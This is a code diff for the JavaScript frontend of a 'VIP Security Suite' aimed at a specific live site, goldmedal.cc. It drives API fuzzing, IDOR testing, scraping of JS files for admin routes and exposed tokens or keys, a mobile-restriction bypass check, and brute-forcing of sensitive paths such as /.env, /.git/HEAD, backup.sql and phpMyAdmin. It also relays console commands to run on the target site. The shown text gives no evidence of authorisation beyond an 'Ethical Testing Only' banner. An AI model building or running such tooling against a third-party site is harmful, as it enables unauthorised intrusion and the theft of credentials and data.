+                showResult('vueRoutesOutput', `Error: ${e.message}`, true);
+            }
+        }
+
+        async function fuzzAPIs() {
+            showLoading('apiFuzzOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/api-discovery`);
+                const data = await resp.json();
+                showResult('apiFuzzOutput', data);
+                document.getElementById('totalEndpoints').textContent = Array.isArray(data) ? data.length : 0;
+                if (Array.isArray(data)) {
+                    data.forEach(item => {
+                        const severity = item.has_data ? 'high' : 'medium';
+                        logFinding(`API: ${item.method} ${item.endpoint} → ${item.status} (${item.length}B)`, severity);
+                    });
+                    document.getElementById('endpointProgress').style.width = 
+                        Math.min(100, (data.length / 150) * 100) + '%';
+                }
+            } catch(e) {
+                showResult('apiFuzzOutput', `Error: ${e.message}`, true);
+            }
+        }
+
+        async function testIDOR() {
+            showLoading('idorOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/idor-test`);
+                const data = await resp.json();
+                showResult('idorOutput', data);
+                if (Array.isArray(data)) {
+                    const vulnerable = data.filter(item => item.potentially_vulnerable);
+                    vulnerable.forEach(item => {
+                        logFinding(`POTENTIAL IDOR: ${item.route} [${item.param}=${item.value}] (${item.length}B)`, 'critical');
+                    });
+                    if (vulnerable.length === 0) {
+                        logFinding('No IDOR vulnerabilities detected.', 'info');
+                    }
+                }
+            } catch(e) {
+                showResult('idorOutput', `Error: ${e.message}`, true);
+            }
+        }
+
+        // ============================================================
+        // VUE JS ANALYSIS
+        // ============================================================
+        async function extractJS() {
+            showLoading('jsOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/extract-js`);
+                const data = await resp.json();
+                showResult('jsOutput', data);
+                Object.keys(data).forEach(file => {
+                    const findings = data[file];
+                    if (findings.api_endpoints?.length > 0) {
+                        logFinding(`API endpoints in ${file}: ${findings.api_endpoints.length} found`, 'critical');
+                    }
+                    if (findings.admin_routes?.length > 0) {
+                        logFinding(`ADMIN ROUTES in ${file}: ${findings.admin_routes.join(', ')}`, 'critical');
+                    }
+                    if (findings.tokens_keys?.length > 0) {
+                        logFinding(`TOKENS/KEYS exposed in ${file}! ${findings.tokens_keys.length} found`, 'critical');
+                    }
+                    if (findings.vue_routes?.length > 0) {
+                        logFinding(`Vue routes in ${file}: ${findings.vue_routes.length}`, 'medium');
+                    }
+                });
+            } catch(e) {
+                showResult('jsOutput', `Error: ${e.message}`, true);
+            }
+        }
+
+        async function viewAppJS() {
+            showLoading('jsOutput');
+            try {
+                const resp = await fetch(`${BASE}/js/app.aca0396932bf42fa0d8.js`);
+                const code = await resp.text();
+                showResult('jsOutput', '// First 5000 chars of app.js:\n' + code.substring(0, 5000) + '\n\n... [truncated]');
+                logFinding(`app.js downloaded (${code.length}B) for manual analysis`, 'info');
+            } catch(e) {
+                try {
+                    const resp = await fetch(`${BASE}/js/app.js`);
+                    const code = await resp.text();
+                    showResult('jsOutput', '// First 5000 chars:\n' + code.substring(0, 5000) + '\n\n... [truncated]');
+                } catch(e2) {
+                    showResult('jsOutput', 'Error loading JS files', true);
+                }
+            }
+        }
+
+        // ============================================================
+        // RECON
+        // ============================================================
+        async function desktopBypass() {
+            showLoading('desktopBypassOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/desktop-bypass`);
+                const data = await resp.json();
+                showResult('desktopBypassOutput', data);
+                if (data.difference?.potential_bypass) {
+                    logFinding('Desktop mode shows different/larger content! Possible mobile-only restriction.', 'high');
+                }
+            } catch(e) {
+                showResult('desktopBypassOutput', `Error: ${e.message}`, true);
+            }
+        }
+
+        async function checkHeaders() {
+            showLoading('headersOutput');
+            try {
+                const resp = await fetch(`${BASE}/hunt/headers`);
+                const data = await resp.json();
+                showResult('headersOutput', data);
+                if (data.vulnerabilities?.length > 0) {
+                    data.vulnerabilities.forEach(v => {
+                        logFinding(`${v.issue} [${v.severity}]`, v.severity.toLowerCase());
+                    });
+                }
+                if (data.total_vulnerabilities === 0) {
+                    logFinding('All security headers properly configured.', 'info');
+                }
+            } catch(e) {
+                showResult('headersOutput', `Error: ${e.message}`, true);
+            }
+        }
+
         async function brutePaths() {
             showLoading('bruteOutput');
             const paths = [
-                '/index.php',
-                '/index.php?s=index',
-                '/index.php?s=index/index/index',
-                '/index.php?s=admin',
-                '/index.php?s=admin/index',
-                '/index.php?s=api',
-                '/index.php?s=api/index',
-                '/index.php?s=user',
-                '/index.php?s=user/index',
-                '/index.php?s=user/login',
-                '/index.php?s=user/AddTikuan',
-                '/index.php?s=home',
-                '/index.php?s=home/index',
-                '/index.php?s=install',
-                '/index.php?s=captcha',
-                '/admin.html',
-                '/login.html',
-                '/dashboard.html',
-                '/register.html',
-                '/robots.txt',
-                '/sitemap.xml',
-                '/.env',
-                '/.git/HEAD',
-                '/.git/config',
-                '/phpinfo.php',
-                '/info.php',
-                '/test.php',
-                '/install.php',
-                '/admin.php',
-                '/config.php',
-                '/backup.zip',
-                '/backup.tar.gz',
-                '/backup.sql',
-                '/database.sql',
-                '/api/v1/',
-                '/api/user',
-                '/api/admin',
+                '/index.php', '/index.php?s=index', '/index.php?s=admin', '/index.php?s=api',
+                '/index.php?s=user', '/index.php?s=user/login', '/index.php?s=user/AddTikuan',
+                '/admin.html', '/login.html', '/dashboard.html', '/register.html',
+                '/robots.txt', '/sitemap.xml', '/.env', '/.git/HEAD',
+                '/phpinfo.php', '/info.php', '/test.php', '/install.php',
+                '/admin.php', '/config.php', '/backup.zip', '/backup.sql',
+                '/api/v1/', '/api/user', '/api/admin', '/api/login',
+                '/adminer.php', '/phpmyadmin/', '/pma/',
+                '/.htaccess', '/nginx.conf', '/web.config',
             ];
-            
             const results = [];
-            for (const p of paths) {
-                try {
-                    const resp = await fetch(`${BASE}/proxy?path=${encodeURIComponent(p)}`);
-                    const data = await resp.json();
-                    const status = data.status_code || 'error';
-                    results.push({
-                        path: p,
-                        status: status,
-                        length: data.length || 0
-                    });
-                    
-                    if (status === 200 && data.length > 0 && data.length < 10000) {
-                        logFinding(`Valid endpoint: ${p} (${data.length} bytes)`, 'medium');
+            const batchSize = 5;
+            
+            for (let i = 0; i < paths.length; i += batchSize) {
+                const batch = paths.slice(i, i + batchSize);
+                const promises = batch.map(async (p) => {
+                    try {
+                        const resp = await fetch(`${BASE}/proxy?path=${encodeURIComponent(p)}`);
+                        const data = await resp.json();
+                        results.push({ path: p, status: data.status_code || 'err', length: data.length || 0 });
+                        if (data.status_code === 200 && data.length > 0 && data.length < 10000) {
+                            logFinding(`Valid path found: ${p} (${data.length}B)`, 'medium');
+                        }
+                    } catch(e) {
+                        results.push({ path: p, error: e.message });
                     }
-                    if (data.body && (data.body.includes('password') || data.body.includes('DB_'))) {
-                        logFinding(`SENSITIVE DATA at ${p}!`, 'critical');
-                    }
-                } catch(e) {
-                    results.push({ path: p, error: e.message });
-                }
+                });
+                await Promise.all(promises);
             }
+            
             showResult('bruteOutput', results);
-            document.getElementById('totalEndpoints').textContent = 
-                results.filter(r => r.status === 200).length;
+            document.getElementById('totalEndpoints').textContent = results.filter(r => r.status === 200).length;
         }
 
-        // ============ INITIAL SERVER CHECK ============
+        async function getVueCommands() {
+            try {
+                const resp = await fetch(`${BASE}/hunt/vue-inspect`);
+                const data = await resp.json();
+                showResult('vueCommandsOutput', '=== RUN THESE ON goldmedal.cc CONSOLE ===\n\n' + data.commands.join('\n'));
+                logFinding('Vue.js inspector commands retrieved', 'info');
+            } catch(e) {
+                showResult('vueCommandsOutput', `Error: ${e.message}`, true);
+            }
+        }
+
+        // ============================================================
+        // SERVER STATUS CHECK
+        // ============================================================
         async function checkServer() {
             try {
-                const resp = await fetch(`${BASE}/proxy?path=/`);
+                const resp = await fetch(`${BASE}/health`);
                 const data = await resp.json();
-                document.getElementById('serverStatus').textContent = 
-                    data.status_code ? '🟢 UP' : '🔴 DOWN';
-                document.getElementById('serverStatus').style.color = 
-                    data.status_code ? '#3fb950' : '#f85149';
+                document.getElementById('serverStatusDot').className = 'status-dot online';
+                document.getElementById('serverStatusText').textContent = 'Connected';
             } catch(e) {
-                document.getElementById('serverStatus').textContent = '🔴 DOWN';
-                document.getElementById('serverStatus').style.color = '#f85149';
+                document.getElementById('serverStatusDot').className = 'status-dot offline';
+                document.getElementById('serverStatusText').textContent = 'Disconnected';
             }
         }
 
-        // ============ INIT ============
-        checkServer();
-        encodeBase64();
-        console.log('🔬 GoldMedal.cc Test Panel Ready');
-        console.log('⚠️ Ethical use only - own environment');
-        console.log('📋 Base URL:', BASE);
-    </script>
+        // ============================================================
+        // KEYBOARD SHORTCUTS
+        // ============================================================
+        document.addEventListener('keydown', function(e) {
+            // Ctrl+Enter to send proxy request
+            if (e.ctrlKey && e.key === 'Enter' && document.activeElement?.id === 'proxyPath') {
+                sendProxy();
+            }
+            // Ctrl+Shift+C to clear log
+            if (e.ctrlKey && e.shiftKey && e.key === 'C') {
+                clearLog();
+            }
+        });
 
+        // ============================================================
+        // INITIALIZATION
+        // ============================================================
+        function init() {
+            checkServer();
+            encodeBase64();
+            setInterval(checkServer, 30000); // Health check every 30s
+            
+            console.log(`
+╔══════════════════════════════════════════════╗
+║   🔬 GoldMedal.cc VIP Security Suite v2.0   ║
+║   Target: goldmedal.cc                      ║
+║   Endpoints: ${BASE}          ║
+║   ⚠️  Ethical Testing Only                   ║
+╚══════════════════════════════════════════════╝
+            `);
+            
+            logFinding('VIP Security Suite initialized. Ready for testing.', 'info');
+            showToast('VIP Security Suite Ready', 'success');
+        }
+        
+        init();
+    </script>
 </body>
-                                                         </html>
+</html>
